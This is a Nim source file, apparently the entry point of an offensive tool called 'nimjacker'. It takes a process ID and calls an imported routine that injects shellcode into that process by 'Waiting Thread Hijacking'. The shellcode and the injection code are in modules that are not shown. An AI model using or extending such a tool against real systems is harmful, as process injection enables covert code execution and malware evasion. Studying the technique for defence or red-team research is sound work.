import winim
import winim/lean
import tables
import strformat
import os
import strutils

# Imports of reorganized modules
import utils/ntdll_api
import utils/threads_util
import utils/memory_utils
import utils/thread_constants
import utils/debug
import shellcode/stub_and_shellcode
import runpe/wth_injection

proc main() =
  # Process command line arguments
  var pid: DWORD = 0
  var debugMode = false
  
  for i in 1..paramCount():
    let param = paramStr(i)
    if param == "--debug":
      debugMode = true
      debug.inDebugMode = true
      echo "Debug mode enabled - execution will pause at breakpoints so you can track the process with x64dbg, useful to learn how this technique works!"
    elif param.startsWith("-"):
      echo "Unknown option: " & param
    else:
      # Assume this is the PID
      try:
        pid = DWORD(parseInt(param))
      except ValueError:
        echo "Invalid process ID: " & param
        return
  
  if pid == 0:
    echo "Waiting Thread Hijacking. Target: WrQueue"
    echo "Usage: nimjacker <PID> [--debug]"
    echo ""
    echo "Options:"
    echo "  --debug    Enable debug mode with execution pauses at breakpoints"
    return
  
  var hProcess = OpenProcess(PROCESS_VM_OPERATION, WINBOOL(FALSE), pid)
  if hProcess == 0:
    echo "Error opening process!"
    return
  
  CloseHandle(hProcess)
  
  if wth_injection.executeInjection(pid):
    echo "Injection successful!\n"
    debug.debugPause("[DEBUG] Process is suspended for further analysis...")
  else:
    echo "Injection failed... :(\n"

when isMainModule:
  main() 